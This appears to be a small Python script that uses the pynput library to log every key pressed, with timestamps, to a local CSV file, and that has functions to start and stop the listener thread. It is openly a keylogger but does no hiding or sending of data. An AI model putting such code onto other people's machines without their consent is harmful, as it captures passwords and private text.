import pynput.keyboard as Keyboard
import csv
import datetime


stop_tracker = None


def writeToCSV(fields):
	with open('keys.csv', 'a', newline='') as f:
		writer = csv.writer(f)
		writer.writerow(fields)


def on_press(key):
	# Callback function whenever a key is pressed
	now = datetime.datetime.now()
	try:
		writeToCSV([key.char, str(now.isoformat())])
	except AttributeError:
		writeToCSV([key, str(now.isoformat())])


def start_keylogger():
	global stop_tracker
	print("start keylogger thread")
	with Keyboard.Listener(on_press=on_press) as listener:
		stop_tracker = listener
		listener.join()
	print('end keylogger thread')


def stop_keylogger():
	global stop_tracker
	if stop_tracker != None:
		stop_tracker.stop()
		stop_tracker = None
	# print(stop_tracker)



